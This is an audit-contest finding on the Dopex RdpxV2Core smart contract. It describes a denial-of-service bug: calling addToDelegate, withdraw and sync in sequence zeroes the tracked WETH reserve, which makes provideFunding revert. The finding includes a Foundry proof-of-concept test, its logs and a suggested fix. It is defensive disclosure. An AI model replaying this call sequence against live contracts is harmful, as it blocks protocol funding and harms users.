# [Dopex Report](https://code4rena.com/reports/2023-08-dopex)

## Findings by Dimulski
| Severity | Title | 
|:--:|:--:|
| [H-01](#H-01) | DoS sending WETH from RdpxV2Core to PerpetualAtlanticVault via provideFunding() | 

## <a id='H-01'></a>[H-01] DoS sending WETH from RdpxV2Core to PerpetualAtlanticVault via provideFunding()
## Lines of code
https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L790-L808

## Vulnerability details
## Imapct
The amount of reserveAsset[reservesIndex["WETH"]].tokenBalance can be set to 0, by first calling addToDelegate() with the current value of reserveAsset[reservesIndex["WETH"]].tokenBalance, then calling withdraw() to withdraw all the deposited weth and then calling sync(). When the admin of RdpxV2Core decides to call provideFunding() in order to send the funding amount of WETH to the PerpetualAtlanticVault contract, the function will revert, because reserveAsset[reservesIndex["WETH"]].tokenBalance can be set to 0, and substracting the fundingAmount (whatever it is, if > 0) is not possible. The provideFunding() function is expected to be called at the end of every epoch as it can be called only once. The attacker can execute the above described flow and set reserveAsset[reservesIndex["WETH"]].tokenBalance to 0 or close to 0 for example 6 days after the epoch has started (if 1 epoch is 7 days), or frontrun the provideFunding() function call. There is an emergencyWithdraw() function so the weth can eventually be withdrawn from the contract, but this is not the expected behavior. The attack will cost only the gas required for the three transactions, and as the intended chain for the Dopex protocol to be deployed is Arbitrum, gas will be pretty cheap.

## Proof of Concept
I have added the below function in the RdpxV2Core contract in order to easily read the value of reserveAsset[reservesIndex["WETH"]].tokenBalance

```solidity
function returnsReserveAsset() public view returns(uint256 result){
      result = reserveAsset[2].tokenBalance;
    }
```

The below function can be added to the Integration.t.sol file in the rdpxV2-core test folder

```solidity
 function test_WrongCalcualtionDelegate() public {
    vaultLp.deposit(100 * 1e18, address(this));
    weth.mint(address(3), 12e18);
    rdpx.mint(address(3), 122e18);
    (uint256 rdpxRequired, uint256 wethRequired) = rdpxV2Core.calculateBondCost(12e18,0);


    vm.startPrank(address(3));
    weth.approve(address(rdpxV2Core), type(uint256).max);
    rdpx.approve(address(rdpxV2Core), type(uint256).max);
    uint256 receiptTokens1 = rdpxV2Core.bond(10 * 1e18, 0, address(1));
    console.log("Here is the reserveAssets[Weth] balance after a user has bonded: ", rdpxV2Core.returnsReserveAsset());
    console.log("rdpxV2Core real Weth balance after bonding: ", weth.balanceOf(address(rdpxV2Core)));
    rdpxV2Core.addToDelegate(2.45 *1e18, 1e8);
    console.log("rdpxV2Core real Weth balance after bondign and delegation of weth: ", weth.balanceOf(address(rdpxV2Core)));
    rdpxV2Core.withdraw(0);
    console.log("rdpxV2Core real Weth balance after bondign, delegation of weth and withdrawing of the delegated weth: ", weth.balanceOf(address(rdpxV2Core)));
    rdpxV2Core.sync();
    console.log("Here is the reserveAssets[Weth] balance after delegeting weth, syncing and then withdrawing the delegated weth: ", rdpxV2Core.returnsReserveAsset());
    console.log("rdpxV2Core real Weth balance after bondign, delegation of weth, withdrawing of weth,  and calling sync: ", weth.balanceOf(address(rdpxV2Core)));
    vm.stopPrank();
  }
  }
```

Those are the logs:
```solidity
 Here is the reserveAssets[Weth] balance after a user has bonded:  2450000000000000000
  rdpxV2Core real Weth balance after bonding:  2450000000000000000
  rdpxV2Core real Weth balance after bondign and delegation of weth:  4900000000000000000
  Here is the reserveAssets[Weth] balance after delegeting weth, syncing and then withdrawing the delegated weth:  0
  rdpxV2Core real Weth balance after bondign, delegation of weth, withdrawing of weth,  and calling sync:  2450000000000000000
```
## Tools Used
Manual Review

## Recommended Mitigation Steps
In the withdraw() function substract the withdrawn amount from totalWethDelegated

## Assessed type
Dos
